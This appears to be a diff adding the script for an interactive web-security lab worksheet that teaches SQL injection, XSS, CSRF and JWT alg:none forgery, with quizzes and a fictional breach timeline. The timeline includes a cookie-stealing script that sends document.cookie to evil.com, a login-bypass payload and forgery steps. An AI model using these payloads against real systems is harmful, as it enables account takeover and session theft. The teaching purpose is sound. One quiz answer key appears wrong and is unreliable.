+        //{ id:'5a1', text:'The attacker bypassed the admin login on Day 2. Which vulnerability from this lab does this match? Write the exact SQL payload category and explain how it worked in this context.', rows:3 },
+        { id:'5a2', text:'On Day 3 the attacker injected a script into a product review. Which type of XSS is this — Reflected or Stored? Explain your reasoning.', rows:3 },
+        { id:'5a3', text:'On Day 4 the attacker modified their JWT to claim admin role. Which specific JWT attack is this? What property of a securely implemented server would have prevented it?', rows:3 },
+      ]
+    },
+    {
+      heading:'Task 5B — The CSRF oversight',
+      questions:[
+        { id:'5b1', text:'On Day 5 the attacker sent a malicious link to an admin. The admin clicked it and unknowingly transferred funds. Which attack from Exercise 3 does this describe? What defence was missing?', rows:3 },
+      ]
+    },
+    {
+      heading:'Task 5C — Fix the application',
+      intro:'You are the new security lead at DevShop. Write exactly one specific, technical fix for each vulnerability found in the breach. Vague answers ("improve security") are not accepted.',
+      type:'fix-plan-table'
+    },
+    // {
+    //   heading:'Task 5D — OWASP mapping',
+    //   intro:'Map each attack from the breach to its OWASP Top 10 (2021) category. Write the code (A01–A10) and category name.',
+    //   type:'owasp-map-table'
+    // },
+    {
+      heading:'Task 5E — Final reflection',
+      questions:[
+        //{ id:'5e1', text:'All four attacks in this breach were in the OWASP Top 10. This list has existed since 2003. Why do these same vulnerabilities keep appearing in production applications year after year? Give two structural reasons (not just "developers are careless").', rows:5 },
+        { id:'5e2', text:'As a developer starting a new project, name three specific habits or tools you would adopt from day one to avoid the vulnerabilities in this lab. Be precise.', rows:5 },
+      ]
+    }
+  ]
+}
+
+]; // end EXERCISES
+
+// ═══════════════════════════════════════════════
+// CUSTOM TABLE BUILDERS
+// ═══════════════════════════════════════════════
+
+function buildSQLTraceTable(){
+  var h='<div class="table-wrap"><table class="lab-table">';
+  h+='<thead><tr><th style="width:30%">Stage</th><th>SQL query (fill in the blanks)</th></tr></thead><tbody>';
+  var rows=[
+    ['Original query (safe input)','SELECT * FROM users WHERE email = \'<input type="text" id="sql-orig-email" placeholder="normal@email.com" style="width:160px" oninput="saveField(\'sql-orig-email\',this.value);updateProgress()">\' AND password = \'<input type="text" id="sql-orig-pw" placeholder="password123" style="width:120px" oninput="saveField(\'sql-orig-pw\',this.value);updateProgress()">\''],
+    ['After injection — email field','SELECT * FROM users WHERE email = \'<input type="text" id="sql-inj-email" placeholder="type the injected payload…" style="width:260px" oninput="saveField(\'sql-inj-email\',this.value);updateProgress()">'],
+    ['What the -- does','<input type="text" id="sql-comment" placeholder="Explain what -- removes from the query…" style="width:100%" oninput="saveField(\'sql-comment\',this.value);updateProgress()">'],
+    ['Result: which row is returned','<input type="text" id="sql-result" placeholder="Which user record does the DB return and why?" style="width:100%" oninput="saveField(\'sql-result\',this.value);updateProgress()">'],
+  ];
+  rows.forEach(function(r){
+    h+='<tr><td class="row-label">'+r[0]+'</td><td style="font-family:var(--mono);font-size:12px;padding:8px">'+r[1]+'</td></tr>';
+  });
+  h+='</tbody></table></div>';
+  return h;
+}
+
+function buildSQLFixComparison(){
+  var h='<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:1rem">';
+  h+='<div><div class="vuln-badge" style="background:var(--red-bg);color:var(--red)">❌ Vulnerable code</div>';
+  h+='<div class="cmd-block"><div class="os-tag red">Node.js + MySQL</div>';
+  h+='<div class="cmd"><span class="cmt">// User input pasted directly into query string</span></div>';
+  h+='<div class="cmd">const sql = <span class="hl">`SELECT * FROM users</span></div>';
+  h+='<div class="cmd"><span class="hl">  WHERE email = \'${email}\'</span></div>';
+  h+='<div class="cmd"><span class="hl">  AND password = \'${password}\'`;</span></div>';
+  h+='<div class="cmd">db.query(sql, callback);</div>';
+  h+='</div></div>';
+  h+='<div><div class="vuln-badge" style="background:var(--teal-bg);color:var(--teal)">✓ Parameterized query</div>';
+  h+='<div class="cmd-block"><div class="os-tag mac">Node.js + MySQL (safe)</div>';
+  h+='<div class="cmd"><span class="cmt">// Query structure compiled first — values passed separately</span></div>';
+  h+='<div class="cmd">const sql = <span class="hl">\'SELECT * FROM users</span></div>';
+  h+='<div class="cmd"><span class="hl">  WHERE email = ? AND password = ?\';</span></div>';
+  h+='<div class="cmd">db.query(sql, <span class="hl">[email, password]</span>, callback);</div>';
+  h+='</div></div>';
+  h+='</div>';
+  h+='<div class="question-block"><div class="question-text"><span class="qnum">Q:</span>In the safe version, the ? placeholders are compiled before the values are inserted. Explain in your own words why this means a payload like <code style="font-family:var(--mono);font-size:12px;background:#f0f4f8;padding:1px 5px;border-radius:3px">\' OR 1=1 --</code> is now completely harmless.</div>';
+  h+='<textarea id="sql-fix-explain" rows="3" placeholder="Your answer…" oninput="saveField(\'sql-fix-explain\',this.value);autoResize(this)"></textarea></div>';
+  return h;
+}
+
+function buildXSSCmd(payload){
+  return '<div class="cmd-block"><div class="os-tag mac">Juice Shop search bar</div><div class="cmd">'+payload+'</div></div>';
+}
+
+function buildCookieTheftTable(){
+  var h='<div class="table-wrap"><table class="lab-table">';
+  h+='<thead><tr><th style="width:40%">Observation</th><th>What you saw</th></tr></thead><tbody>';
+  var rows=[
+    ['Did the alert box appear?','alert-appear'],
+    ['What did it display?','alert-content'],
+    ['Can you read a token / session value?','token-visible'],
+    ['Is the HttpOnly flag set on the cookie?','httponly-flag'],
+  ];
+  rows.forEach(function(r){
+    h+='<tr><td class="row-label">'+r[0]+'</td><td><input type="text" id="ct-'+r[1]+'" placeholder="Write your observation…" oninput="saveField(\'ct-'+r[1]+'\',this.value);updateProgress()"></td></tr>';
+  });
+  h+='</tbody></table></div>';
+  return h;
+}
+
+function buildXSSComparisonTable(){
+  var h='<div class="table-wrap"><table class="lab-table">';
+  h+='<thead><tr><th style="width:28%">Property</th><th>Reflected XSS</th><th>Stored XSS</th></tr></thead><tbody>';
+  var props=['Where is the script?','Who is affected?','Does it persist after reload?','Common location','Severity','Example'];
+  props.forEach(function(p,i){
+    h+='<tr><td class="row-label">'+p+'</td>';
+    h+='<td><input type="text" id="xss-r-'+i+'" placeholder="…" oninput="saveField(\'xss-r-'+i+'\',this.value);updateProgress()"></td>';
+    h+='<td><input type="text" id="xss-s-'+i+'" placeholder="…" oninput="saveField(\'xss-s-'+i+'\',this.value);updateProgress()"></td>';
+    h+='</tr>';
+  });
+  h+='</tbody></table></div>';
+  return h;
+}
+
+function buildXSSFixQuiz(){
+  var items=[
+    { id:'xfix1', q:'An attacker injects <code style="font-family:var(--mono);font-size:12px">&lt;script&gt;</code> into a search field that is reflected in the HTML. Which fix directly stops the browser rendering it as a tag?', opts:['Output encoding (HTML entities)','CSRF token','SameSite cookie','Rate limiting'], ans:0 },
+    { id:'xfix2', q:'A stored XSS script tries to read document.cookie to steal the session. Which defence makes the cookie invisible to JavaScript?', opts:['Content Security Policy','HttpOnly flag on cookie','Parameterized queries','HTTPS'], ans:1 },
+    { id:'xfix3', q:'You want to allow user-uploaded HTML content but block any inline &lt;script&gt; from executing. Which header do you set?', opts:['X-Frame-Options','Content-Security-Policy','Strict-Transport-Security','X-XSS-Protection'], ans:2 },
+  ];
+  return items.map(function(item){
+    var opts=item.opts.map(function(o,i){
+      return '<div class="quiz-opt" id="opt-'+item.id+'-'+i+'" onclick="pickXSSFix(\''+item.id+'\','+i+','+item.ans+')">'+o+'</div>';
+    }).join('');
+    return '<div class="quiz-block"><div class="quiz-q">'+item.q+'</div><div class="quiz-opts">'+opts+'</div><div class="quiz-fb" id="fb-'+item.id+'"></div></div>';
+  }).join('');
+}
+
+function buildCSRFScenario(){
+  var h='<div class="info-box amber"><h4>🏦 Scenario: Banking App CSRF</h4>';
+  h+='<p style="margin-bottom:.75rem">Alice is logged into <strong>bank.com</strong>. Her session cookie is set and the browser sends it automatically on every request to bank.com. She then visits a news site that secretly contains this hidden HTML:</p>';
+  h+='<div class="cmd-block"><div class="os-tag red">Attacker\'s hidden page</div>';
+  h+='<div class="cmd">&lt;form action="https://bank.com/transfer" method="POST" id="f"&gt;</div>';
+  h+='<div class="cmd">  &lt;input name="to" value="attacker_account"&gt;</div>';
+  h+='<div class="cmd">  &lt;input name="amount" value="5000"&gt;</div>';
+  h+='<div class="cmd">&lt;/form&gt;</div>';
+  h+='<div class="cmd">&lt;script&gt;document.getElementById("f").submit();&lt;/script&gt;</div>';
+  h+='</div>';
+  h+='<p>Alice\'s browser automatically submits this form to bank.com. Her session cookie is sent. The bank sees a valid authenticated request and transfers $5,000 — without Alice ever clicking anything.</p>';
+  h+='</div>';
+  return h;
+}
+
+function buildCSRFvsXSSTable(){
+  var h='<p style="font-size:13.5px;margin-bottom:.75rem;color:var(--txt2)">CSRF and XSS are often confused. Fill in the comparison table:</p>';
+  h+='<div class="table-wrap"><table class="lab-table">';
+  h+='<thead><tr><th style="width:28%">Property</th><th>CSRF</th><th>XSS</th></tr></thead><tbody>';
+  var props=['Who initiates the action?','Does attacker need JS injection?','What does attacker need from victim?','Does victim notice?','Primary defence'];
+  props.forEach(function(p,i){
+    h+='<tr><td class="row-label">'+p+'</td>';
+    h+='<td><input type="text" id="cmp-csrf-'+i+'" placeholder="…" oninput="saveField(\'cmp-csrf-'+i+'\',this.value);updateProgress()"></td>';
+    h+='<td><input type="text" id="cmp-xss-'+i+'" placeholder="…" oninput="saveField(\'cmp-xss-'+i+'\',this.value);updateProgress()"></td>';
+    h+='</tr>';
+  });
+  h+='</tbody></table></div>';
+  return h;
+}
+
+function buildJWTPartsTable(){
+  var h='<div class="table-wrap"><table class="lab-table">';
+  h+='<thead><tr><th style="width:22%">JWT Part</th><th>Raw value (first 5-10 chars)</th><th>Decoded content</th></tr></thead><tbody>';
+  var parts=['Header (1st segment)','Payload (2nd segment)','Signature (3rd segment)'];
+  parts.forEach(function(p,i){
+    h+='<tr><td class="row-label">'+p+'</td>';
+    h+='<td><input type="text" id="jwt-raw-'+i+'" placeholder="eyJ…" oninput="saveField(\'jwt-raw-'+i+'\',this.value);updateProgress()"></td>';
+    h+='<td><input type="text" id="jwt-dec-'+i+'" placeholder="Decoded JSON or description…" oninput="saveField(\'jwt-dec-'+i+'\',this.value);updateProgress()"></td>';
+    h+='</tr>';
+  });
+  h+='</tbody></table></div>';
+  return h;
+}
+
+function buildJWTForgeSteps(){
+  var h='<p style="font-size:13.5px;color:var(--txt2);margin-bottom:.75rem">Follow these steps to forge a JWT with <code style="font-family:var(--mono);font-size:12px;background:#f0f4f8;padding:1px 5px;border-radius:3px">alg:none</code>. Use jwt.io to build it.</p>';
+  var steps=[
+    { n:1, title:'Modify the header', desc:'Change the algorithm to <code style="font-family:var(--mono);font-size:12px;background:#f0f4f8;padding:1px 5px;border-radius:3px">"alg": "none"</code>. This tells the server not to verify the signature.' },
+    { n:2, title:'Modify the payload', desc:'Change your role or email in the payload section. For example, add <code style="font-family:var(--mono);font-size:12px;background:#f0f4f8;padding:1px 5px;border-radius:3px">"role": "admin"</code>.' },
+    { n:3, title:'Remove the signature', desc:'The forged token has no signature — just delete it. The format is now: <code style="font-family:var(--mono);font-size:12px;background:#f0f4f8;padding:1px 5px;border-radius:3px">header.payload.</code> (note the trailing dot).' },
+    { n:4, title:'Inject the token', desc:'In Juice Shop DevTools → Application → Local Storage, replace the <strong>token</strong> value with your forged token. Reload the page.' },
+  ];
+  steps.forEach(function(s){
+    h+='<div style="display:flex;gap:12px;margin-bottom:.85rem;align-items:flex-start">';
+    h+='<div style="flex-shrink:0;width:26px;height:26px;border-radius:50%;background:var(--navy);color:#fff;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center">'+s.n+'</div>';
+    h+='<div><div style="font-size:13.5px;font-weight:600;color:var(--txt);margin-bottom:2px">'+s.title+'</div><div style="font-size:13px;color:var(--txt2)">'+s.desc+'</div></div>';
+    h+='</div>';
+  });
+  return h;
+}
+
+function buildAuthQuiz(){
+  var items=[
+    { id:'aq1', q:'A user\'s JWT expires in 7 days. They change their password. What happens to their existing token?', opts:['It is immediately invalidated','It remains valid until expiry','It is refreshed automatically','It is stored server-side'], ans:1 },
+    { id:'aq2', q:'Which storage location makes a session token immune to XSS theft?', opts:['localStorage','sessionStorage','HttpOnly cookie','JavaScript variable'], ans:2 },
+    //{ id:'aq3', q:'What does the JWT "exp" claim contain?', opts:['The expiry date in human-readable format','A Unix timestamp of the expiry time','The number of minutes until expiry','A Base64-encoded expiry string'], ans:1 },
+    //{ id:'aq4', q:'A library function verifyToken() accepts any algorithm specified in the token\'s header. Which attack does this enable?', opts:['SQL injection','CSRF','alg:none JWT forgery','Brute force'], ans:2 },
+  ];
+  return items.map(function(item){
+    var opts=item.opts.map(function(o,i){
+      return '<div class="quiz-opt" id="opt-'+item.id+'-'+i+'" onclick="pickAuth(\''+item.id+'\','+i+','+item.ans+')">'+o+'</div>';
+    }).join('');
+    return '<div class="quiz-block"><div class="quiz-q">'+item.q+'</div><div class="quiz-opts">'+opts+'</div><div class="quiz-fb" id="fb-'+item.id+'"></div></div>';
+  }).join('');
+}
+
+function buildIncidentReport(){
+  var h='<div class="info-box red"><h4>🚨 Incident Report — DevShop (E-commerce Platform)</h4>';
+  h+='<p style="margin-bottom:.75rem;font-weight:600">Timeline of a 5-day breach:</p>';
+  var events=[
+    { day:'Day 1', txt:'Attacker registers an account and logs in normally. They browse the site.' },
+    { day:'Day 2', txt:'On the admin login page, attacker tries email <code style="font-family:var(--mono);font-size:12px;background:#f9e0e0;padding:1px 5px;border-radius:3px">admin@devshop.com\' OR \'1\'=\'1</code>. Login succeeds. Full admin panel is accessible.' },
+    { day:'Day 3', txt:'Attacker posts a product review containing <code style="font-family:var(--mono);font-size:12px;background:#f9e0e0;padding:1px 5px;border-radius:3px">&lt;script&gt;fetch(\'https://evil.com?c=\'+document.cookie)&lt;/script&gt;</code>. Every admin who views that review has their session cookie sent to the attacker\'s server.' },
+    { day:'Day 4', txt:'Using a stolen admin JWT, the attacker modifies the payload to add <code style="font-family:var(--mono);font-size:12px;background:#f9e0e0;padding:1px 5px;border-radius:3px">"role":"superadmin"</code> and changes the alg to "none". The server accepts it. Attacker gains database export access.' },
+    { day:'Day 5', txt:'Attacker sends a link to a DevShop admin containing a hidden form that auto-submits a $10,000 refund to the attacker\'s account. The admin clicks it while logged in. The refund is processed.' },
+  ];
+  events.forEach(function(e){
+    h+='<div style="display:flex;gap:10px;margin-bottom:.6rem;align-items:flex-start">';
+    h+='<div style="flex-shrink:0;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--red);background:var(--red-bg);border:1px solid var(--red-bd);border-radius:4px;padding:2px 7px;margin-top:1px">'+e.day+'</div>';
+    h+='<div style="font-size:13.5px;color:var(--txt)">'+e.txt+'</div></div>';
+  });
+  h+='</div>';
+  return h;
+}
+
+function buildFixPlanTable(){
+  var vulns=['SQL Injection (Day 2)','Stored XSS (Day 3)','JWT (Day 4)','CSRF (Day 5)'];
+  var h='<div class="table-wrap"><table class="lab-table">';
+  h+='<thead><tr><th style="width:32%">Vulnerability</th><th>Your specific technical fix</th></tr></thead><tbody>';
+  vulns.forEach(function(v,i){
+    h+='<tr><td class="row-label">'+v+'</td>';
+    h+='<td><input type="text" id="fix-'+i+'" placeholder="Be specific — name the technique, library, or header…" oninput="saveField(\'fix-'+i+'\',this.value);updateProgress()"></td>';
+    h+='</tr>';
+  });
+  h+='</tbody></table></div>';
+  return h;
+}
+
+function buildOWASPMapTable(){
+  var attacks=['SQL injection login bypass','Stored XSS via product review','JWT token forgery','CSRF fund transfer'];
+  var h='<div class="table-wrap"><table class="lab-table">';
+  h+='<thead><tr><th style="width:38%">Attack in breach</th><th style="width:14%">OWASP code</th><th>OWASP category name</th></tr></thead><tbody>';
+  attacks.forEach(function(a,i){
+    h+='<tr><td class="row-label">'+a+'</td>';
+    h+='<td><input type="text" id="owasp-code-'+i+'" placeholder="A0x" style="width:60px" oninput="saveField(\'owasp-code-'+i+'\',this.value);updateProgress()"></td>';
+    h+='<td><input type="text" id="owasp-name-'+i+'" placeholder="Category name…" oninput="saveField(\'owasp-name-'+i+'\',this.value);updateProgress()"></td>';
+    h+='</tr>';
+  });
+  h+='</tbody></table></div>';
+  return h;
+}
+
+// ═══════════════════════════════════════════════
+// QUIZ HANDLERS
+// ═══════════════════════════════════════════════
+function pickXSSFix(id, chosen, correct){
+  _handleQuiz(id, chosen, correct,
+    'Correct! That is the right defence for this scenario.',
+    'Not quite — think about which layer of defence matches the attack vector.'
+  );
+}
+function pickAuth(id, chosen, correct){
+  _handleQuiz(id, chosen, correct,
+    'Correct!',
+    'Incorrect — re-read the relevant concept and try again.'
+  );
+}
+function _handleQuiz(id, chosen, correct, okMsg, noMsg){
+  var numOpts=document.querySelectorAll('[id^="opt-'+id+'-"]').length;
+  for(var i=0;i<numOpts;i++){
+    var el=document.getElementById('opt-'+id+'-'+i);
+    if(el){el.classList.remove('selected','correct','wrong');}
+  }
+  var chosenEl=document.getElementById('opt-'+id+'-'+chosen);
+  var fb=document.getElementById('fb-'+id);
+  if(chosen===correct){
+    if(chosenEl)chosenEl.classList.add('correct');
+    if(fb){fb.className='quiz-fb ok show';fb.textContent='✓ '+okMsg;}
+    saveField('quiz-'+id, 'correct:'+chosen);
+  } else {
+    if(chosenEl)chosenEl.classList.add('wrong');
+    var corrEl=document.getElementById('opt-'+id+'-'+correct);
+    if(corrEl)corrEl.classList.add('correct');
+    if(fb){fb.className='quiz-fb no show';fb.textContent='✗ '+noMsg;}
+    saveField('quiz-'+id, 'wrong:'+chosen+',correct:'+correct);
+  }
+  updateProgress();
+}
+
+// ═══════════════════════════════════════════════
+// STATE
+// ═══════════════════════════════════════════════
+var currentEx = 0;
+var answers = {};
+var AP = {
+  strikes:0, log:[], currentField:'',
+  record:function(type,detail){
+    var e={ts:new Date().toISOString(),type:type,field:AP.currentField,detail:detail||''};
+    AP.log.push(e); AP.renderILog(e);
+  },
+  renderILog:function(entry){
+    var log=document.getElementById('ilog'); if(!log)return;
+    var d=document.createElement('div');
+    d.className='il-e'+(entry.type!=='info'?' il-w':'');
+    var t=entry.ts.slice(11,19);
+    d.textContent='['+t+'] '+(entry.field?'('+entry.field+') ':'')+entry.detail;
+    log.appendChild(d); log.scrollTop=log.scrollHeight;
+  },
+  onPaste:function(e,fid){
+    AP.strikes++; AP.record('paste','Paste attempt #'+AP.strikes+' in "'+fid+'"');
+    e.preventDefault(); AP.buildDots(); AP.updateChip();
+    document.getElementById('apMsg').textContent='Copy-pasting is not allowed. Please type your answer — this demonstrates your understanding. The pasted content was discarded.';
+    document.getElementById('apSubMsg').textContent='This incident is recorded in your submission.';
+    document.getElementById('apOverlay').classList.add('show');
+  },
+  updateChip:function(){
+    var c=document.getElementById('strikeChip'); if(!c)return;
+    c.style.display='inline-flex'; c.classList.add('danger');
+  },
+  wire:function(el){
+    if(!el||el._apWired)return; el._apWired=true;
+    var fid=el.id||el.name||'unknown';
+    el.addEventListener('focus',function(){AP.currentField=fid;});
+    el.addEventListener('blur',function(){AP.currentField='';});
+    el.addEventListener('paste',function(e){AP.onPaste(e,fid);});
+    el.addEventListener('keydown',function(e){
+      if((e.ctrlKey||e.metaKey)&&e.key==='v'){AP.onPaste(e,fid);}
+      if((e.ctrlKey||e.metaKey)&&e.key==='a'){
+        if(!['f-name','f-id','f-class','f-date'].includes(fid)){e.preventDefault();}
+      }
+    });
+    el.addEventListener('drop',function(e){
+      if(e.dataTransfer.types.includes('text/plain')){e.preventDefault();AP.strikes++;AP.updateChip();}
+    });
+  },
+  wireAll:function(){
+    document.querySelectorAll('textarea,input[type=text]').forEach(function(el){
+      if(['f-name','f-id','f-class','f-date'].includes(el.id))return;
+      AP.wire(el);
+    });
+  },
+  buildDots:function(){
+    var row=document.getElementById('apStrikeRow'); if(!row)return;
+    row.innerHTML=''; var total=Math.max(AP.strikes,3);
+    for(var i=0;i<total;i++){var d=document.createElement('div');d.className='ap-sdot'+(i<AP.strikes?' hit':'');row.appendChild(d);}
+  }
+};
+function dismissWarning(){document.getElementById('apOverlay').classList.remove('show');}
+
+// ═══════════════════════════════════════════════
+// BUILD
+// ═══════════════════════════════════════════════
+function init(){
+  buildNav(); buildExercises(); loadDraft(); goTo(0);
+  document.getElementById('f-date').value=new Date().toISOString().split('T')[0];
+  setInterval(saveDraft,90000);
+}
+
+function buildNav(){
+  var nav=document.getElementById('navItems');
+  EXERCISES.forEach(function(ex,i){
+    var item=document.createElement('div');
+    item.className='nav-item'; item.id='nav-'+i;
+    item.innerHTML='<div class="nav-dot" id="navdot-'+i+'">'+(i+1)+'</div><span>'+ex.title+'</span>';
+    item.onclick=function(){goTo(i);};
+    nav.appendChild(item);
+  });
+}
+
+function buildExercises(){
+  var container=document.getElementById('exerciseContainer');
+  EXERCISES.forEach(function(ex,i){
+    var card=document.createElement('div');
+    card.className='exercise-card'; card.id='card-'+i;
+    card.innerHTML=buildExHTML(ex,i);
+    container.appendChild(card);
+    card.querySelectorAll('textarea,input,select').forEach(function(el){
+      el.addEventListener('input',function(){updateProgress();autoResize(el);});
+      el.addEventListener('change',function(){updateProgress();});
+    });
+  });
+}
+
+function buildExHTML(ex,exIdx){
+  var h='';
+  h+='<div class="exercise-header">';
+  h+='<div class="exercise-tag" style="color:'+ex.tagColor+';background:'+ex.tagBg+'">'+ex.tag+'</div>';
+  h+='<div class="exercise-title">'+ex.title+'</div>';
+  h+='<div class="exercise-desc">'+ex.desc+'</div>';
+  h+='<div class="exercise-progress"><div class="ex-prog-bar"><div class="ex-prog-fill" id="exprog-'+exIdx+'" style="width:0%"></div></div><div class="ex-prog-label" id="exprog-lbl-'+exIdx+'">0% answered</div></div>';
+  h+='</div><div class="exercise-body">';
+  h+='<div class="info-box blue"><h4>⚙ Setup</h4><p>'+ex.setup+'</p></div>';
+
+  ex.sections.forEach(function(sec){
+    if(sec.heading) h+='<div class="section-heading">'+sec.heading+'</div>';
+    if(sec.intro) h+='<p style="font-size:13.5px;margin-bottom:.75rem;color:var(--txt2)">'+sec.intro+'</p>';
+
+    if(sec.type==='info'){
+      var cls=sec.color||'blue';
+      h+='<div class="info-box '+cls+'"><h4>'+sec.title+'</h4><p>'+sec.body+'</p></div>';
+    }
+    else if(sec.type==='sql-trace-table')      h+=buildSQLTraceTable();
+    else if(sec.type==='sql-fix-comparison')   h+=buildSQLFixComparison();
+    else if(sec.type==='xss-cmd')              h+=buildXSSCmd(sec.payload);
+    else if(sec.type==='cookie-theft-table')   h+=buildCookieTheftTable();
+    else if(sec.type==='xss-comparison-table') h+=buildXSSComparisonTable();
+    else if(sec.type==='xss-fix-quiz')         h+=buildXSSFixQuiz();
+    else if(sec.type==='csrf-scenario')        h+=buildCSRFScenario();
+    else if(sec.type==='csrf-vs-xss-table')    h+=buildCSRFvsXSSTable();
+    else if(sec.type==='jwt-parts-table')      h+=buildJWTPartsTable();
+    else if(sec.type==='jwt-forge-steps')      h+=buildJWTForgeSteps();
+    else if(sec.type==='auth-quiz')            h+=buildAuthQuiz();
+    else if(sec.type==='incident-report')      h+=buildIncidentReport();
+    else if(sec.type==='fix-plan-table')       h+=buildFixPlanTable();
+    else if(sec.type==='owasp-map-table')      h+=buildOWASPMapTable();
+
+    if(sec.questions){
+      sec.questions.forEach(function(q){
+        h+='<div class="question-block">';
+        h+='<div class="question-text"><span class="qnum">Q:</span>'+q.text+'</div>';
+        h+='<textarea id="ans-'+q.id+'" rows="'+(q.rows||3)+'" placeholder="Your answer…" oninput="saveField(\'ans-'+q.id+'\',this.value);autoResize(this)" onchange="saveField(\'ans-'+q.id+'\',this.value)"></textarea>';
+        h+='</div>';
+      });
+    }
+  });
+
+  h+='<div class="nav-btns">';
+  if(exIdx>0) h+='<button class="btn-ghost" onclick="goTo('+(exIdx-1)+')">← Previous</button>';
+  else h+='<div></div>';
+  h+='<div class="nav-btns-right">';
+  if(exIdx<EXERCISES.length-1) h+='<button class="btn-primary" onclick="goTo('+(exIdx+1)+')">Next exercise →</button>';
+  else h+='<button class="btn-success" onclick="finish()">✓ Finish &amp; download</button>';
+  h+='</div></div></div>';
+  return h;
+}
+
+// ═══════════════════════════════════════════════
+// NAVIGATION
+// ═══════════════════════════════════════════════
+function goTo(idx){
+  document.querySelectorAll('.exercise-card').forEach(function(c){c.classList.remove('visible');});
+  document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active');});
+  document.getElementById('completionCard').classList.remove('visible');
+  var card=document.getElementById('card-'+idx);
+  if(card){card.classList.add('visible');window.scrollTo(0,0);}
+  var nav=document.getElementById('nav-'+idx);
+  if(nav)nav.classList.add('active');
+  currentEx=idx;
+}
+
+function finish(){
+  document.querySelectorAll('.exercise-card').forEach(function(c){c.classList.remove('visible');});
+  document.getElementById('completionCard').classList.add('visible');
+  document.getElementById('completionCard').scrollIntoView({behavior:'smooth'});
+  saveDraft();
+}
+
+// ═══════════════════════════════════════════════
+// PROGRESS
+// ═══════════════════════════════════════════════
+function saveField(id,val){answers[id]=val;}
+function autoResize(el){el.style.height='auto';el.style.height=el.scrollHeight+'px';}
+
+function getAllFields(){
+  var f={};
+  document.querySelectorAll('textarea,input[type=text],select').forEach(function(el){
+    if(el.id&&!['f-name','f-id','f-class','f-date'].includes(el.id))f[el.id]=el;
+  });
+  return f;
+}
+
+function countAnswered(fields){
+  var total=0,done=0;
+  Object.keys(fields).forEach(function(id){
+    var el=fields[id]; total++;
+    var val=(el.value||'').trim();
+    if(val&&val!=='')done++;
+  });
+  return{total:total,done:done};
+}
+
+function updateProgress(){
+  var fields=getAllFields();
+  var counts=countAnswered(fields);
+  var pct=counts.total>0?Math.round(counts.done/counts.total*100):0;
+  document.getElementById('progFill').style.width=pct+'%';
+  document.getElementById('progPct').textContent=pct+'%';
+  EXERCISES.forEach(function(ex,i){
+    var exFields={};
+    var card=document.getElementById('card-'+i);
+    Object.keys(fields).forEach(function(id){
+      if(card&&card.contains(fields[id]))exFields[id]=fields[id];
+    });
+    var ec=countAnswered(exFields);
+    var epct=ec.total>0?Math.round(ec.done/ec.total*100):0;
+    var fill=document.getElementById('exprog-'+i);
+    var lbl=document.getElementById('exprog-lbl-'+i);
+    if(fill)fill.style.width=epct+'%';
+    if(lbl)lbl.textContent=epct+'% answered';
+    var dot=document.getElementById('navdot-'+i);
+    if(dot){
+      if(epct===100){dot.classList.add('done');dot.textContent='✓';}
+      else{dot.classList.remove('done');dot.textContent=i+1;}
+    }
+    var navItem=document.getElementById('nav-'+i);
+    if(navItem)navItem.classList.toggle('done',epct===100);
+  });
+  document.querySelectorAll('textarea').forEach(function(el){
+    el.classList.toggle('answered',(el.value||'').trim().length>0);
+  });
+}
+
+// ═══════════════════════════════════════════════
+// SAVE / LOAD / DOWNLOAD
+// ═══════════════════════════════════════════════
+function gatherAll(){
+  var data={
+    lab:'module3-web-app-security',
+    meta:{
+      name:document.getElementById('f-name').value,
+      studentId:document.getElementById('f-id').value,
+      classSection:document.getElementById('f-class').value,
+      date:document.getElementById('f-date').value,
+      savedAt:new Date().toISOString()
+    },
+    answers:{},
+    integrityLog:{pasteAttempts:AP.strikes,events:AP.log}
+  };
+  var fields=getAllFields();
+  Object.keys(fields).forEach(function(id){data.answers[id]=fields[id].value;});
+  return data;
+}
+
+function saveDraft(){
+  try{
+    localStorage.setItem('mod3_lab_draft',JSON.stringify(gatherAll()));
+    showToast('Draft saved ✓');
+  }catch(e){showToast('Could not save');}
+}
+
+function loadDraft(){
+  try{
+    var raw=localStorage.getItem('mod3_lab_draft');
+    if(!raw)return;
+    var data=JSON.parse(raw);
+    if(data.meta){
+      if(data.meta.name)document.getElementById('f-name').value=data.meta.name;
+      if(data.meta.studentId)document.getElementById('f-id').value=data.meta.studentId;
+      if(data.meta.classSection)document.getElementById('f-class').value=data.meta.classSection;
+      if(data.meta.date)document.getElementById('f-date').value=data.meta.date;
+    }
+    if(data.answers){
+      Object.keys(data.answers).forEach(function(id){
+        var el=document.getElementById(id);
+        if(!el)return;
+        el.value=data.answers[id];
+        if(el.tagName==='TEXTAREA')autoResize(el);
+      });
+    }
+    updateProgress();
+    showToast('Draft restored ✓');
+  }catch(e){}
+}
+
+function downloadJSON(){
+  var data=gatherAll();
+  var name=(data.meta.name||'student').replace(/\s+/g,'-').toLowerCase();
+  var blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
+  var url=URL.createObjectURL(blob);
+  var a=document.createElement('a');
+  a.href=url; a.download='module3-lab-'+name+'.json'; a.click();
+  URL.revokeObjectURL(url); showToast('Downloaded ✓');
+}
+
+function showToast(msg){
+  var t=document.getElementById('toast');
+  t.textContent=msg; t.classList.add('show');
+  setTimeout(function(){t.classList.remove('show');},2200);
+}
+
+// ═══════════════════════════════════════════════
+// BOOT
+// ═══════════════════════════════════════════════
+document.addEventListener('DOMContentLoaded',function(){
+  init(); AP.buildDots(); AP.wireAll();
+  var observer=new MutationObserver(function(){AP.wireAll();});
+  observer.observe(document.getElementById('exerciseContainer'),{childList:true,subtree:true});
+  AP.record('info','Lab initialised — integrity monitoring active');
+});
+document.addEventListener('keydown',function(e){
+  if((e.ctrlKey||e.metaKey)&&e.key==='s'){e.preventDefault();saveDraft();}
+});
+document.addEventListener('visibilitychange',function(){
+  AP.record('info',document.hidden?'Tab hidden':'Tab visible again');
+});
+document.addEventListener('contextmenu',function(e){
+  var el=e.target;
+  if(el&&(el.tagName==='TEXTAREA'||el.tagName==='INPUT')){
+    if(!['f-name','f-id','f-class','f-date'].includes(el.id)){e.preventDefault();}
+  }
+});
+</script>
+</body>
+</html>
